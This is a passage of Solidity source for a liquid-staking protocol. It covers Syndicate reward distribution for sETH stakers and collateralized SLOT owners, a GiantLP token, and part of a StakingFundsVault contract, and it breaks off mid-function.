_blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            uint256 _sETHAmount = _sETHAmounts[i];\n            if (sETHStakedBalanceForKnot[_blsPubKey][msg.sender] < _sETHAmount) revert NothingStaked();\n\n            (address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n            IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakeHouse));\n\n            // Only decrease totalFreeFloatingShares in the event that the knot is still active in the syndicate\n            if (!isNoLongerPartOfSyndicate[_blsPubKey]) {\n                totalFreeFloatingShares -= _sETHAmount;\n            }\n\n            sETHTotalStakeForKnot[_blsPubKey] -= _sETHAmount;\n            sETHStakedBalanceForKnot[_blsPubKey][msg.sender] -= _sETHAmount;\n\n            bool transferResult = sETH.transfer(_sETHRecipient, _sETHAmount);\n            if (!transferResult) revert TransferFailed();\n\n            emit UnStaked(_blsPubKey, _sETHAmount);\n        }\n    }\n\n    /// @notice Claim ETH cashflow from the syndicate as an sETH staker proportional to how much the user has staked\n    /// @param _recipient Address that will receive the share of ETH funds\n    /// @param _blsPubKeys List of BLS public keys that the caller has staked against\n    function claimAsStaker(address _recipient, bytes[] calldata _blsPubKeys) public nonReentrant {\n        _claimAsStaker(_recipient, _blsPubKeys);\n    }\n\n    /// @param _blsPubKeys List of BLS public keys that the caller has staked against\n    function claimAsCollateralizedSLOTOwner(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_recipient == address(0)) revert ZeroAddress();\n        if (_recipient == address(this)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information for all shares\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            if (!isKnotRegistered[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            // process newly accrued ETH and distribute it to collateralized SLOT owners for the given knot\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKey);\n\n            // Calculate total amount of unclaimed ETH\n            uint256 userShare = accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender];\n\n            // This is designed to cope with falling SLOT balances i.e. when collateralized SLOT is burnt after applying penalties\n            uint256 unclaimedUserShare = userShare - claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender];\n\n            // Send ETH to the user if there is an unclaimed amount\n            if (unclaimedUserShare > 0) {\n                // Increase total claimed and claimed at the user level\n                totalClaimed += unclaimedUserShare;\n                claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][msg.sender] = userShare;\n\n                // Send ETH to user\n                (bool success,) = _recipient.call{value: unclaimedUserShare}(\"\");\n                if (!success) revert TransferFailed();\n\n                emit ETHClaimed(\n                    _blsPubKey,\n                    msg.sender,\n                    _recipient,\n                    unclaimedUserShare,\n                    true\n                );\n            }\n        }\n    }\n\n    /// @notice For any new ETH received by the syndicate, at the knot level allocate ETH owed to each collateralized owner\n    /// @param _blsPubKey BLS public key relating to the collateralized owners that need updating\n    function updateCollateralizedSlotOwnersAccruedETH(bytes memory _blsPubKey) external {\n        _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKey);\n    }\n\n    /// @notice For any new ETH received by the syndicate, at the knot level allocate ETH owed to each collateralized owner and do it for a batch of knots\n    /// @param _blsPubKeys List of BLS public keys related to the collateralized owners that need updating\n    function batchUpdateCollateralizedSlotOwnersAccruedETH(bytes[] memory _blsPubKeys) external {\n        uint256 numOfKeys = _blsPubKeys.length;\n        if (numOfKeys == 0) revert EmptyArray();\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(_blsPubKeys[i]);\n        }\n    }\n\n    /// @notice Syndicate contract can receive ETH\n    receive() external payable {\n        // No logic here because one cannot assume that more than 21K GAS limit is forwarded\n    }\n\n    /// @notice Calculate the amount of unclaimed ETH for a given BLS publice key + free floating SLOT staker without factoring in unprocessed rewards\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    /// @param _user The address of a user that has staked sETH against the BLS public key\n    function calculateUnclaimedFreeFloatingETHShare(bytes memory _blsPubKey, address _user) public view returns (uint256) {\n        // Check the user has staked sETH for the KNOT\n        uint256 stakedBal = sETHStakedBalanceForKnot[_blsPubKey][_user];\n        if (stakedBal < 1 gwei) revert FreeFloatingStakeAmountTooSmall();\n\n        // Get the amount of ETH eligible for the user based on their staking amount\n        uint256 accumulatedETHPerShare = _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(_blsPubKey);\n        uint256 userShare = (accumulatedETHPerShare * stakedBal) / PRECISION;\n\n        // Calculate how much their unclaimed share of ETH is based on total ETH claimed so far\n        return userShare - sETHUserClaimForKnot[_blsPubKey][_user];\n    }\n\n    /// @notice Using `highestSeenBalance`, this is the amount that is separately allocated to either free floating or collateralized SLOT holders\n    function calculateETHForFreeFloatingOrCollateralizedHolders() public view returns (uint256) {\n        // Get total amount of ETH that can be drawn down by all SLOT holders associated with a knot\n        uint256 ethPerKnot = totalETHReceived();\n\n        // Get the amount of ETH eligible for free floating sETH or collateralized SLOT stakers\n        return ethPerKnot / 2;\n    }\n\n    /// @notice Preview the amount of unclaimed ETH available for an sETH staker against a KNOT which factors in unprocessed rewards from new ETH sent to contract\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    /// @param _staker The address of a user that has staked sETH against the BLS public key\n    function previewUnclaimedETHAsFreeFloatingStaker(\n        address _staker,\n        bytes calldata _blsPubKey\n    ) external view returns (uint256) {\n        uint256 currentAccumulatedETHPerFreeFloatingShare = accumulatedETHPerFreeFloatingShare;\n        uint256 updatedAccumulatedETHPerFreeFloatingShare =\n                            currentAccumulatedETHPerFreeFloatingShare + calculateNewAccumulatedETHPerFreeFloatingShare();\n\n        uint256 stakedBal = sETHStakedBalanceForKnot[_blsPubKey][_staker];\n        uint256 userShare = (updatedAccumulatedETHPerFreeFloatingShare * stakedBal) / PRECISION;\n\n        return userShare - sETHUserClaimForKnot[_blsPubKey][_staker];\n    }\n\n    /// @notice Preview the amount of unclaimed ETH available for a collatearlized SLOT staker against a KNOT which factors in unprocessed rewards from new ETH sent to contract\n    /// @param _staker Address of a collateralized SLOT owner for a KNOT\n    /// @param _blsPubKey BLS public key of the KNOT that is registered with the syndicate\n    function previewUnclaimedETHAsCollateralizedSlotOwner(\n        address _staker,\n        bytes calldata _blsPubKey\n    ) external view returns (uint256) {\n        // Per collateralized SLOT per KNOT before distributing to individual collateralized owners\n        uint256 accumulatedSoFar = accumulatedETHPerCollateralizedSlotPerKnot\n                    + ((calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n\n        uint256 unprocessedForKnot = accumulatedSoFar - totalETHProcessedPerCollateralizedKnot[_blsPubKey];\n\n        // Fetch information on what has been processed so far against the ECDSA address of the collateralized SLOT owner\n        uint256 currentAccrued = accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][_staker];\n\n        // Fetch information about the knot including total slashed amount\n        uint256 currentSlashedAmount = getSlotRegistry().currentSlashedAmountOfSLOTForKnot(_blsPubKey);\n        uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(_blsPubKey);\n        (address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n\n        // Find the collateralized SLOT owner and work out how much they're owed\n        for (uint256 i; i < numberOfCollateralisedSlotOwnersForKnot; ++i) {\n            address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, i);\n            if (collateralizedOwnerAtIndex == _staker) {\n                uint256 balance = getSlotRegistry().totalUserCollateralisedSLOTBalanceForKnot(\n                    stakeHouse,\n                    collateralizedOwnerAtIndex,\n                    _blsPubKey\n                );\n\n                if (currentSlashedAmount < 4 ether) {\n                    currentAccrued +=\n                        balance * unprocessedForKnot / (4 ether - currentSlashedAmount);\n                }\n                break;\n            }\n        }\n\n        return currentAccrued - claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][_staker];\n    }\n\n    /// @notice Amount of ETH per free floating share that hasn't yet been allocated to each share\n    function getUnprocessedETHForAllFreeFloatingSlot() public view returns (uint256) {\n        return calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerFreeFloating;\n    }\n\n    /// @notice Amount of ETH per collateralized share that hasn't yet been allocated to each share\n    function getUnprocessedETHForAllCollateralizedSlot() public view returns (uint256) {\n        return ((calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n    }\n\n    /// @notice New accumulated ETH per free floating share that hasn't yet been applied\n    /// @dev The return value is scaled by 1e24\n    function calculateNewAccumulatedETHPerFreeFloatingShare() public view returns (uint256) {\n        uint256 ethSinceLastUpdate = getUnprocessedETHForAllFreeFloatingSlot();\n        return _calculateNewAccumulatedETHPerFreeFloatingShare(ethSinceLastUpdate);\n    }\n\n    /// @notice New accumulated ETH per collateralized share per knot that hasn't yet been applied\n    function calculateNewAccumulatedETHPerCollateralizedSharePerKnot() public view returns (uint256) {\n        uint256 ethSinceLastUpdate = getUnprocessedETHForAllCollateralizedSlot();\n        return accumulatedETHPerCollateralizedSlotPerKnot + ethSinceLastUpdate;\n    }\n\n    /// @notice Total amount of ETH received by the contract\n    function totalETHReceived() public view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @dev Internal logic for initializing the syndicate contract\n    function _initialize(\n        address _contractOwner,\n        uint256 _priorityStakingEndBlock,\n        address[] memory _priorityStakers,\n        bytes[] memory _blsPubKeysForSyndicateKnots\n    ) internal {\n        // Transfer ownership from the deployer to the address specified as the owner\n        _transferOwnership(_contractOwner);\n\n        // Add the initial set of knots to the syndicate\n        _registerKnotsToSyndicate(_blsPubKeysForSyndicateKnots);\n\n        // Optionally process priority staking if the required params and array is configured\n        if (_priorityStakingEndBlock > block.number) {\n            priorityStakingEndBlock = _priorityStakingEndBlock;\n            _addPriorityStakers(_priorityStakers);\n        }\n\n        emit ContractDeployed();\n    }\n\n    /// Given an amount of ETH allocated to the collateralized SLOT owners of a KNOT, distribute this amongs the current set of collateralized owners (a dynamic set of addresses and balances)\n    function _updateCollateralizedSlotOwnersLiabilitySnapshot(bytes memory _blsPubKey) internal {\n        // Establish how much new ETH is for the new KNOT\n        uint256 unprocessedETHForCurrentKnot =\n                    accumulatedETHPerCollateralizedSlotPerKnot - totalETHProcessedPerCollateralizedKnot[_blsPubKey];\n\n        // Get information about the knot i.e. associated house and whether its active\n        (address stakeHouse,,,,,bool isActive) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n\n        // Assuming that there is unprocessed ETH and the knot is still part of the syndicate\n        if (unprocessedETHForCurrentKnot > 0 && !isNoLongerPartOfSyndicate[_blsPubKey]) {\n            uint256 currentSlashedAmount = getSlotRegistry().currentSlashedAmountOfSLOTForKnot(_blsPubKey);\n\n            // Don't allocate ETH when the current slashed amount is four. Syndicate will wait until ETH is topped up to claim revenue\n            if (currentSlashedAmount < 4 ether) {\n                // This copes with increasing numbers of collateralized slot owners and also copes with SLOT that has been slashed but not topped up\n                uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(_blsPubKey);\n\n                if (numberOfCollateralisedSlotOwnersForKnot == 1) {\n                    // For only 1 collateralized SLOT owner, they get the full amount of unprocessed ETH for the knot\n                    address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, 0);\n                    accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][collateralizedOwnerAtIndex] += unprocessedETHForCurrentKnot;\n                } else {\n                    for (uint256 i; i < numberOfCollateralisedSlotOwnersForKnot; ++i) {\n                        address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, i);\n                        uint256 balance = getSlotRegistry().totalUserCollateralisedSLOTBalanceForKnot(\n                            stakeHouse,\n                            collateralizedOwnerAtIndex,\n                            _blsPubKey\n                        );\n\n                        accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][collateralizedOwnerAtIndex] +=\n                            balance * unprocessedETHForCurrentKnot / (4 ether - currentSlashedAmount);\n                    }\n                }\n\n                // record so unprocessed goes to zero\n                totalETHProcessedPerCollateralizedKnot[_blsPubKey] = accumulatedETHPerCollateralizedSlotPerKnot;\n            }\n        }\n\n        // if the knot is no longer active, no further accrual of rewards are possible snapshots are possible but ETH accrued up to that point\n        // Basically, under a rage quit or voluntary withdrawal from the beacon chain, the knot kick is auto-propagated to syndicate\n        if (!isActive && !isNoLongerPartOfSyndicate[_blsPubKey]) {\n            _deRegisterKnot(_blsPubKey);\n        }\n    }\n\n    function _calculateCollateralizedETHOwedPerKnot() internal view returns (uint256) {\n        uint256 collateralizedSLOTShareOfETH = calculateETHForFreeFloatingOrCollateralizedHolders();\n        uint256 collateralizedSLOTShareOfETHPerKnot = (collateralizedSLOTShareOfETH / numberOfRegisteredKnots);\n        return collateralizedSLOTShareOfETHPerKnot;\n    }\n\n    /// @dev Business logic for calculating per collateralized share how much ETH from 1559 rewards is owed\n    function _calculateNewAccumulatedETHPerCollateralizedShare(uint256 _ethSinceLastUpdate) internal view returns (uint256) {\n        return (_ethSinceLastUpdate * PRECISION) / (numberOfRegisteredKnots * 4 ether);\n    }\n\n    /// @dev Business logic for calculating per free floating share how much ETH from 1559 rewards is owed\n    function _calculateNewAccumulatedETHPerFreeFloatingShare(uint256 _ethSinceLastUpdate) internal view returns (uint256) {\n        return totalFreeFloatingShares > 0 ? (_ethSinceLastUpdate * PRECISION) / totalFreeFloatingShares : 0;\n    }\n\n    /// @dev Business logic for adding a new set of knots to the syndicate for collecting revenue\n    function _registerKnotsToSyndicate(bytes[] memory _blsPubKeysForSyndicateKnots) internal {\n        uint256 knotsToRegister = _blsPubKeysForSyndicateKnots.length;\n        if (knotsToRegister == 0) revert EmptyArray();\n        numberOfRegisteredKnots += knotsToRegister;\n\n        for (uint256 i; i < knotsToRegister; ++i) {\n            bytes memory blsPubKey = _blsPubKeysForSyndicateKnots[i];\n\n            if (isKnotRegistered[blsPubKey]) revert KnotIsAlreadyRegistered();\n\n            // incomming knot collateralized SLOT holders do not get historical earnings\n            totalETHProcessedPerCollateralizedKnot[blsPubKey] = accumulatedETHPerCollateralizedSlotPerKnot;\n\n            // Health check - if knot is inactive or slashed, should it really be part of the syndicate?\n            // KNOTs closer to 32 effective at all times is the target\n            (,,,,,bool isActive) = getStakeHouseUniverse().stakeHouseKnotInfo(blsPubKey);\n            if (!isActive) revert InactiveKnot();\n\n            uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(blsPubKey);\n            if (numberOfCollateralisedSlotOwnersForKnot < 1) revert InvalidNumberOfCollateralizedOwners();\n            if (getSlotRegistry().currentSlashedAmountOfSLOTForKnot(blsPubKey) != 0) revert InvalidNumberOfCollateralizedOwners();\n\n            isKnotRegistered[blsPubKey] = true;\n            emit KNOTRegistered(blsPubKey);\n        }\n    }\n\n    /// @dev Business logic for adding priority stakers to the syndicate\n    function _addPriorityStakers(address[] memory _priorityStakers) internal {\n        if (_priorityStakers.length == 0) revert EmptyArray();\n        for (uint256 i; i < _priorityStakers.length; ++i) {\n            address staker = _priorityStakers[i];\n\n            if (i > 0 && staker < _priorityStakers[i-1]) revert DuplicateArrayElements();\n\n            isPriorityStaker[staker] = true;\n\n            emit PriorityStakerRegistered(staker);\n        }\n    }\n\n    /// @dev Business logic for de-registering a set of knots from the syndicate and doing the required snapshots to ensure historical earnings are preserved\n    function _deRegisterKnots(bytes[] calldata _blsPublicKeys) internal {\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            bytes memory blsPublicKey = _blsPublicKeys[i];\n\n            // Do one final snapshot of ETH owed to the collateralized SLOT owners so they can claim later\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(blsPublicKey);\n\n            // Execute the business logic for de-registering the single knot\n            _deRegisterKnot(blsPublicKey);\n        }\n    }\n\n    /// @dev Business logic for de-registering a specific knots assuming all accrued ETH has been processed\n    function _deRegisterKnot(bytes memory _blsPublicKey) internal {\n        if (isKnotRegistered[_blsPublicKey] == false) revert KnotIsNotRegisteredWithSyndicate();\n        if (isNoLongerPartOfSyndicate[_blsPublicKey] == true) revert KnotHasAlreadyBeenDeRegistered();\n\n        // We flag that the knot is no longer part of the syndicate\n        isNoLongerPartOfSyndicate[_blsPublicKey] = true;\n\n        // For the free floating and collateralized SLOT of the knot, snapshot the accumulated ETH per share\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] = accumulatedETHPerFreeFloatingShare;\n\n        // We need to reduce `totalFreeFloatingShares` in order to avoid further ETH accruing to shares of de-registered knot\n        totalFreeFloatingShares -= sETHTotalStakeForKnot[_blsPublicKey];\n\n        // Total number of registered knots with the syndicate reduces by one\n        numberOfRegisteredKnots -= 1;\n\n        emit KnotDeRegistered(_blsPublicKey);\n    }\n\n    /// @dev Work out the accumulated ETH per free floating share value that must be used for distributing ETH\n    function _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(\n        bytes memory _blsPublicKey\n    ) internal view returns (uint256) {\n        return\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] > 0 ?\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] :\n        accumulatedETHPerFreeFloatingShare;\n    }\n\n    /// @dev Business logic for allowing a free floating SLOT holder to claim their share of ETH\n    function _claimAsStaker(address _recipient, bytes[] calldata _blsPubKeys) internal {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_recipient == address(0)) revert ZeroAddress();\n        if (_recipient == address(this)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            if (!isKnotRegistered[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            uint256 unclaimedUserShare = calculateUnclaimedFreeFloatingETHShare(_blsPubKey, msg.sender);\n\n            // this means that user can call the funtion even if there is nothing to claim but the\n            // worst that will happen is that they will just waste gas. this is needed for unstaking\n            if (unclaimedUserShare > 0) {\n                // Increase total claimed at the contract level\n                totalClaimed += unclaimedUserShare;\n\n                // Work out which accumulated ETH per free floating share value was used\n                uint256 accumulatedETHPerShare = _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(_blsPubKey);\n\n                // Update the total ETH claimed by the free floating SLOT holder based on their share of sETH\n                sETHUserClaimForKnot[_blsPubKey][msg.sender] =\n                (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION;\n\n                // Send ETH to user\n                (bool success,) = _recipient.call{value: unclaimedUserShare}(\"\");\n                if (!success) revert TransferFailed();\n\n                emit ETHClaimed(\n                    _blsPubKey,\n                    msg.sender,\n                    _recipient,\n                    unclaimedUserShare,\n                    false\n                );\n            }\n        }\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\n/// @dev Interface for initializing a newly deployed LP token\ninterface ILPTokenInit {\n    function init(\n        address _deployer,\n        address _transferHookProcessor,\n        string calldata tokenSymbol,\n        string calldata tokenName\n    ) external;\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\ncontract GiantLP is ERC20 {\n\n    /// @notice Address of giant pool that deployed the giant LP token\n    address public pool;\n\n    /// @notice Optional address of contract that will process transfers of giant LP\n    ITransferHookProcessor public transferHookProcessor;\n\n    /// @notice Last interacted timestamp for a given address\n    mapping(address => uint256) public lastInteractedTimestamp;\n\n    constructor(\n        address _pool,\n        address _transferHookProcessor,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        pool = _pool;\n        transferHookProcessor = ITransferHookProcessor(_transferHookProcessor);\n    }\n\n    function mint(address _recipient, uint256 _amount) external {\n        require(msg.sender == pool, \"Only pool\");\n        _mint(_recipient, _amount);\n    }\n\n    function burn(address _recipient, uint256 _amount) external {\n        require(msg.sender == pool, \"Only pool\");\n        _burn(_recipient, _amount);\n    }\n\n    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).beforeTokenTransfer(_from, _to, _amount);\n    }\n\n    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n        lastInteractedTimestamp[_from] = block.timestamp;\n        lastInteractedTimestamp[_to] = block.timestamp;\n        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);\n    }\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        